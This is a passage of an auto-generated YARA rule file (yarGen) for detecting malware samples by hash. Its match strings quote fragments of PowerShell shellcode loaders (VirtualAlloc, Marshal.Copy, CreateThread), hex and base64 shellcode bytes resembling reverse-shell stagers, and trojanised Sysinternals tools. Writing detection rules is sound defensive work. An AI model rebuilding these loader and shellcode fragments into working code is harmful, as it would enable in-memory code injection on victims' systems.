      $s13 = "xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0x92,0xbe,0x30,0xe5,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41" ascii /* score: '1.00'*/
      $s14 = "0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d," ascii /* score: '1.00'*/
      $s15 = "x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0" ascii /* score: '1.00'*/
      $s16 = "f,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0" ascii /* score: '1.00'*/
      $s17 = "48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0" ascii /* score: '1.00'*/
      $s18 = ",0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41" ascii /* score: '1.00'*/
      $s19 = "xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58" ascii /* score: '1.00'*/
      $s20 = ",0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49," ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5224 and filesize < 9KB and
      8 of them
}

rule f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0 {
   meta:
      description = "mw - file f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = "$eLZcKJTH = Add-Type -memberDefinition $NhJPnZmYjAP -Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii /* score: '11.00'*/
      $s5 = "[System.Runtime.InteropServices.Marshal]::Copy($pBuSZNYsOf,0,$eqducsHQFUPpv,$pBuSZNYsOf.Length)" fullword ascii /* score: '10.00'*/
      $s6 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s7 = "$eLZcKJTH::CreateThread(0,0,$eqducsHQFUPpv,0,0,0)" fullword ascii /* score: '7.00'*/
      $s8 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
      $s9 = "$eqducsHQFUPpv = $eLZcKJTH::VirtualAlloc(0,[Math]::Max($pBuSZNYsOf.Length,0x1000),0x3000,0x40)" fullword ascii /* score: '4.00'*/
      $s10 = "[Byte[]] $pBuSZNYsOf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x5" ascii /* score: '4.00'*/
      $s11 = "$NhJPnZmYjAP = @\"" fullword ascii /* score: '4.00'*/
      $s12 = "[Byte[]] $pBuSZNYsOf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x5" ascii /* score: '4.00'*/
      $s13 = "0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x5" ascii /* score: '1.00'*/
      $s14 = ",0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d" ascii /* score: '1.00'*/
      $s15 = "8,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x4" ascii /* score: '1.00'*/
      $s16 = "a,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x" ascii /* score: '1.00'*/
      $s17 = ",0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xb" ascii /* score: '1.00'*/
      $s18 = "0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81," ascii /* score: '1.00'*/
      $s19 = "df,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85," ascii /* score: '1.00'*/
      $s20 = "41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x4e24 and filesize < 9KB and
      8 of them
}

rule sig_785b5a5a7e290b1a00edf82a373b05dda47f252ec91ec64659b64eb98f9cba7a {
   meta:
      description = "mw - file 785b5a5a7e290b1a00edf82a373b05dda47f252ec91ec64659b64eb98f9cba7a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "785b5a5a7e290b1a00edf82a373b05dda47f252ec91ec64659b64eb98f9cba7a"
   strings:
      $x1 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualProtect), (wtbN @([IntPtr" ascii /* score: '31.00'*/
      $s2 = "$lm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualAlloc), (wtbN @([IntPtr]" ascii /* score: '27.00'*/
      $s3 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualProtect), (wtbN @([IntPtr" ascii /* score: '27.00'*/
      $s4 = "$lm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualAlloc), (wtbN @([IntPtr]" ascii /* score: '27.00'*/
      $s5 = "-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s6 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll WaitForSingleObject), (wtbN @" ascii /* score: '22.00'*/
      $s7 = "        $ePk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll CreateThread), (wtbN @" ascii /* score: '22.00'*/
      $s8 = "        $ePk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll CreateThread), (wtbN @" ascii /* score: '22.00'*/
      $s9 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll WaitForSingleObject), (wtbN @" ascii /* score: '22.00'*/
      $s10 = "        $jmW = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\'" ascii /* score: '19.00'*/
      $s11 = "([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jmW.GetMe" ascii /* score: '15.00'*/
      $s12 = "[Byte[]]$ytS = [System.Convert]::FromBase64String(\"/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQ" ascii /* score: '11.00'*/
      $s13 = "chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78" ascii /* score: '11.00'*/
      $s14 = "[System.Runtime.InteropServices.Marshal]::Copy($ytS, 0, $lm, $ytS.length)" fullword ascii /* score: '10.00'*/
      $s15 = "thod('GetModuleHandle')).Invoke($null, @($d3v)))), $m9))" fullword ascii /* score: '9.00'*/
      $s16 = "], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lm, [Uint32]$ytS.Length, 0x10, [Ref]$hAKM)) -eq $true) {" fullword ascii /* score: '8.00'*/
      $s17 = "0B4hcB0TAHQi0gYi1ggAdNQhcl0PEmLNIsB1jH/McDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyA" ascii /* score: '7.00'*/
      $s18 = "[Byte[]]$ytS = [System.Convert]::FromBase64String(\"/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQ" ascii /* score: '7.00'*/
      $s19 = "ABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoNBjLZWgCAB3xieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2" ascii /* score: '7.00'*/
      $s20 = "mplementationFlags('Runtime, Managed')" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule sig_7f5b0d5a1a15c2fd6534803134d1995958ad487fc718b5ef54314c3a8de1724d {
   meta:
      description = "mw - file 7f5b0d5a1a15c2fd6534803134d1995958ad487fc718b5ef54314c3a8de1724d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "7f5b0d5a1a15c2fd6534803134d1995958ad487fc718b5ef54314c3a8de1724d"
   strings:
      $x1 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualProtect), (myQN @([IntPt" ascii /* score: '31.00'*/
      $s2 = "$jY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualAlloc), (myQN @([IntPtr" ascii /* score: '27.00'*/
      $s3 = "$jY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualAlloc), (myQN @([IntPtr" ascii /* score: '27.00'*/
      $s4 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll VirtualProtect), (myQN @([IntPt" ascii /* score: '27.00'*/
      $s5 = "-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s6 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll WaitForSingleObject), (myQN " ascii /* score: '22.00'*/
      $s7 = "        $zI9lE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll CreateThread), (myQ" ascii /* score: '22.00'*/
      $s8 = "        $zI9lE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll CreateThread), (myQ" ascii /* score: '22.00'*/
      $s9 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xe22d kernel32.dll WaitForSingleObject), (myQN " ascii /* score: '22.00'*/
      $s10 = "        $xBV = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\'" ascii /* score: '19.00'*/
      $s11 = "([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($xBV.GetMe" ascii /* score: '15.00'*/
      $s12 = "hf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO74B" ascii /* score: '11.00'*/
      $s13 = "[Byte[]]$fW = [System.Convert]::FromBase64String(\"/OiPAAAAYInlMdJki1Iwi1IMi1IUMf8Pt0omi3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi" ascii /* score: '11.00'*/
      $s14 = "[System.Runtime.InteropServices.Marshal]::Copy($fW, 0, $jY, $fW.length)" fullword ascii /* score: '10.00'*/
      $s15 = "thod('GetModuleHandle')).Invoke($null, @($zG)))), $q6))" fullword ascii /* score: '9.00'*/
      $s16 = "r], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($jY, [Uint32]$fW.Length, 0x10, [Ref]$y08)) -eq $true) {" fullword ascii /* score: '8.00'*/
      $s17 = "ImplementationFlags('Runtime, Managed')" fullword ascii /* score: '7.00'*/
      $s18 = "B4hcB0TAHQi0gYUItYIAHThcl0PDH/SYs0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAA" ascii /* score: '7.00'*/
      $s19 = "[Byte[]]$fW = [System.Convert]::FromBase64String(\"/OiPAAAAYInlMdJki1Iwi1IMi1IUMf8Pt0omi3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi" ascii /* score: '7.00'*/
      $s20 = "Bod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoNBjL+GgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2c" ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule b1f32e797d0ff51fd926834b89167ba45c3ca8a75f2cfe8cda7dbb1c9fdc6775 {
   meta:
      description = "mw - file b1f32e797d0ff51fd926834b89167ba45c3ca8a75f2cfe8cda7dbb1c9fdc6775"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b1f32e797d0ff51fd926834b89167ba45c3ca8a75f2cfe8cda7dbb1c9fdc6775"
   strings:
      $x1 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualProtect), (qD @([IntPtr], [" ascii /* score: '31.00'*/
      $s2 = "$mU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualAlloc), (qD @([IntPtr], [U" ascii /* score: '27.00'*/
      $s3 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualProtect), (qD @([IntPtr], [" ascii /* score: '27.00'*/
      $s4 = "$mU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualAlloc), (qD @([IntPtr], [U" ascii /* score: '27.00'*/
      $s5 = "-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s6 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll WaitForSingleObject), (qD @([In" ascii /* score: '22.00'*/
      $s7 = "        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll WaitForSingleObject), (qD @([In" ascii /* score: '22.00'*/
      $s8 = "        $fxL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll CreateThread), (qD @([In" ascii /* score: '22.00'*/
      $s9 = "        $fxL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll CreateThread), (qD @([In" ascii /* score: '22.00'*/
      $s10 = "        $kzA = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\'" ascii /* score: '19.00'*/
      $s11 = "([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kzA.GetMe" ascii /* score: '15.00'*/
      $s12 = "C2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO" ascii /* score: '11.00'*/
      $s13 = "[Byte[]]$ixMV8 = [System.Convert]::FromBase64String(\"/OiPAAAAYInlMdJki1Iwi1IMi1IUD7dKJjH/i3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPA" ascii /* score: '11.00'*/
      $s14 = "[System.Runtime.InteropServices.Marshal]::Copy($ixMV8, 0, $mU, $ixMV8.length)" fullword ascii /* score: '10.00'*/
      $s15 = "thod('GetModuleHandle')).Invoke($null, @($pLZ)))), $tuL))" fullword ascii /* score: '9.00'*/
      $s16 = "UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($mU, [Uint32]$ixMV8.Length, 0x10, [Ref]$yL)) -eq $true) {" fullword ascii /* score: '8.00'*/
      $s17 = "ImplementationFlags('Runtime, Managed')" fullword ascii /* score: '7.00'*/
      $s18 = "yAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpolJEDcWgCAB32ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2g" ascii /* score: '7.00'*/
      $s19 = "[Byte[]]$ixMV8 = [System.Convert]::FromBase64String(\"/OiPAAAAYInlMdJki1Iwi1IMi1IUD7dKJjH/i3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPA" ascii /* score: '7.00'*/
      $s20 = "Qi0B4hcB0TAHQi1ggUAHTi0gYhcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDM" ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule sig_8012df1d348d1fd3a17244e9582a9d6f6057332a2391c9abc68a2b67a1426f89 {
   meta:
      description = "mw - file 8012df1d348d1fd3a17244e9582a9d6f6057332a2391c9abc68a2b67a1426f89"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "8012df1d348d1fd3a17244e9582a9d6f6057332a2391c9abc68a2b67a1426f89"
   strings:
      $s1 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
      $s2 = "AQAPRH1" fullword ascii /* score: '5.00'*/
      $s3 = "AXAX^YZAXAYAZH" fullword ascii /* score: '4.00'*/
      $s4 = "@.sgee" fullword ascii /* score: '1.00'*/
      $s5 = "}(XAWYh" fullword ascii /* score: '1.00'*/
      $s6 = "A^PPM1" fullword ascii /* score: '1.00'*/
      $s7 = "Rich}E" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298_7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc_0 {
   meta:
      description = "mw - from files 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298, 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938, dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      hash2 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      hash3 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"Process Explorer\" version" ascii /* score: '53.00'*/
      $x2 = "semblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicK" ascii /* score: '36.00'*/
      $s3 = "C:\\agent\\_work\\68\\s\\sys\\x64\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s4 = "C:\\agent\\_work\\68\\s\\sys\\Win32\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s5 = "gAutoruns - Sysinternals: www.sysinternals.com" fullword wide /* score: '29.00'*/
      $s6 = "SCRIPTRUNNER.EXE" fullword wide /* score: '28.00'*/
      $s7 = "C:\\agent\\_work\\68\\s\\exe\\Release\\procexp.pdb" fullword ascii /* score: '27.00'*/
      $s8 = "C:\\agent\\_work\\68\\s\\exe\\x64\\Release\\procexp64.pdb" fullword ascii /* score: '27.00'*/
      $s9 = "taskhostw.exe" fullword wide /* score: '27.00'*/
      $s10 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide /* score: '25.00'*/
      $s11 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide /* score: '25.00'*/
      $s12 = "rity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedP" ascii /* score: '23.00'*/
      $s13 = "crosoft.com/exporting }}{\\fldrslt{www.microsoft.com/exporting}}}}\\cf1\\ul\\f0\\fs19  <{{\\field{\\*\\fldinst{HYPERLINK \"http:" ascii /* score: '23.00'*/
      $s14 = "rosoft.com/exporting\"}}{\\fldrslt{http://www.microsoft.com/exporting}}}}\\f0\\fs19 >\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '23.00'*/
      $s15 = "* use the software for commercial software hosting services." fullword wide /* score: '23.00'*/
      $s16 = "yedputil.dll" fullword wide /* score: '23.00'*/
      $s17 = "Environment\\UserInitMprLogonScript" fullword wide /* score: '21.00'*/
      $s18 = "https://www.virustotal.com" fullword wide /* score: '21.00'*/
      $s19 = "EdpGetContextForProcess" fullword ascii /* score: '20.00'*/
      $s20 = "\\caps\\fs20 6.\\tab\\fs19 Export Restrictions\\caps0 .\\b0   The software is subject to United States export laws and regulatio" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600_5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b_1 {
   meta:
      description = "mw - from files 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600, 5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd, 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9, a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6, cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a, fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      hash2 = "5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd"
      hash3 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      hash4 = "a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
      hash5 = "cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a"
      hash6 = "fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
   strings:
      $s1 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s2 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s4 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s5 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s6 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s7 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s8 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s9 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s10 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s11 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s12 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s13 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s14 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s15 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s16 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s17 = "./mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s18 = "__head_lib32_libmsvcrt_def_a" fullword ascii /* score: '9.00'*/
      $s19 = "C__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s20 = "FGetStartupInfoA" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1_bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500_2 {
   meta:
      description = "mw - from files 77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1, bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330, bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30, eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1"
      hash2 = "bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330"
      hash3 = "bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30"
      hash4 = "eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
   strings:
      $s1 = "estrictions on destinations, end users and end use.  For additional information, see \\cf1\\ul www.microsoft.com/exporting <http" ascii /* score: '28.00'*/
      $s2 = "mbly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86" ascii /* score: '26.00'*/
      $s3 = "osoft-com:asm.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></reque" ascii /* score: '22.00'*/
      $s4 = "/www.microsoft.com/exporting>\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '17.00'*/
      $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '17.00'*/
      $s6 = "\"x86\" version=\"2.0.0.0\" type=\"win32\"></assemblyIdentity><description>File System Monitor</description><dependency><depende" ascii /* score: '14.00'*/
      $s7 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s8 = "port services for it.\\b\\par" fullword ascii /* score: '7.00'*/
